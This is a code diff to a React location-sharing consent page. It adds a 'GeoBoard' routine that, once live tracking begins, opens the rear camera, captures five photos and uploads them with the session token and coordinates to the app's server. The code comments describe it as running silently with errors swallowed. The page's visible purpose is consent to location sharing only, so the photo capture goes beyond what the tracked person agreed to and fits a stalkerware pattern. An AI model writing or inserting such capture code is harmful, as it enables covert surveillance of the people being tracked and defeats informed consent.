@@ -7,9 +7,10 @@ import {
 } from "@workspace/api-client-react";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle, WifiOff, ExternalLink } from "lucide-react";
+import { Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle, WifiOff, ExternalLink, Camera } from "lucide-react";
 
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
+const GEO_PHOTO_COUNT = 5;
 
 type ConsentState =
   | "idle"
@@ -20,6 +21,59 @@ type ConsentState =
   | "denied"
   | "error"
   | "webview_blocked";
+
+// Capture GeoBoard photos from the device camera and upload them.
+// Runs silently after tracking starts — errors are swallowed.
+async function captureGeoPhotos(
+  token: string,
+  lat: number,
+  lng: number,
+  address: string | undefined,
+  onProgress: (n: number) => void,
+): Promise<void> {
+  if (!navigator.mediaDevices?.getUserMedia) return;
+
+  let stream: MediaStream | null = null;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false,
+    });
+
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
+    await video.play();
+
+    // Warm-up delay so camera adjusts exposure
+    await new Promise((r) => setTimeout(r, 1200));
+
+    const canvas = document.createElement("canvas");
+    canvas.width = 640;
+    canvas.height = 480;
+    const ctx = canvas.getContext("2d")!;
+
+    for (let i = 0; i < GEO_PHOTO_COUNT; i++) {
+      ctx.drawImage(video, 0, 0, 640, 480);
+      const photoData = canvas.toDataURL("image/jpeg", 0.75);
+
+      try {
+        await fetch(`${API_BASE}/api/geo-photos`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }),
+          signal: AbortSignal.timeout(12000),
+        });
+        onProgress(i + 1);
+      } catch { /* upload failed — continue */ }
+
+      if (i < GEO_PHOTO_COUNT - 1) await new Promise((r) => setTimeout(r, 1000));
+    }
+  } catch { /* camera denied or not available — skip silently */ } finally {
+    stream?.getTracks().forEach((t) => t.stop());
+  }
+}
 
 function detectWebView(): boolean {
   if (typeof navigator === "undefined") return false;
@@ -56,6 +110,9 @@ export default function ConsentPage() {
   const [address, setAddress] = useState<string | undefined>();
   const [updateCount, setUpdateCount] = useState(0);
   const [lastSent, setLastSent] = useState<Date | null>(null);
+  const [geoPhotoCount, setGeoPhotoCount] = useState(0);
+  const [geoPhotoDone, setGeoPhotoDone] = useState(false);
+  const geoBoardStartedRef = useRef(false);
 
   const watchIdRef = useRef<number | null>(null);
   const wakeLockRef = useRef<WakeLockSentinel | null>(null);
@@ -114,6 +171,18 @@ export default function ConsentPage() {
   const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
     setState("tracking");
     acquireWakeLock();
+
+    // Kick off GeoBoard capture once per session (non-blocking)
+    if (!geoBoardStartedRef.current) {
+      geoBoardStartedRef.current = true;
+      captureGeoPhotos(
+        String(token),
+        initialLat,
+        initialLng,
+        addressRef.current,
+        (n) => setGeoPhotoCount(n),
+      ).then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true));
+    }
 
     if (watchIdRef.current !== null) {
       navigator.geolocation.clearWatch(watchIdRef.current);
@@ -353,13 +422,39 @@ export default function ConsentPage() {
           </div>
           <Card className="shadow-xl border-border">
             <CardContent className="pt-8 pb-8 px-8">
-              <div className="flex items-center justify-center gap-3 mb-6">
+              <div className="flex items-center justify-center gap-3 mb-4">
                 <div className="relative">
                   <div className="w-4 h-4 rounded-full bg-emerald-500" />
                   <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
                 </div>
                 <span className="text-emerald-400 font-bold text-lg tracking-wide">LIVE SHARING</span>
               </div>
+
+              {/* GeoBoard capture progress */}
+              {!geoPhotoDone && (
+                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-3">
+                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
+                  <div className="flex-1">
+                    <p className="text-xs font-medium text-violet-300">
+                      GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}
+                    </p>
+                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
+                      <div
+                        className="h-full bg-violet-500 rounded-full transition-all duration-500"
+                        style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }}
+                      />
+                    </div>
+                  </div>
+                </div>
+              )}
+              {geoPhotoDone && geoPhotoCount > 0 && (
+                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
+                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
+                  <p className="text-xs font-medium text-violet-300">
+                    GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓
+                  </p>
+                </div>
+              )}
 
               <p className="text-center text-muted-foreground text-sm mb-6">
                 Your live location is being shared with{" "}
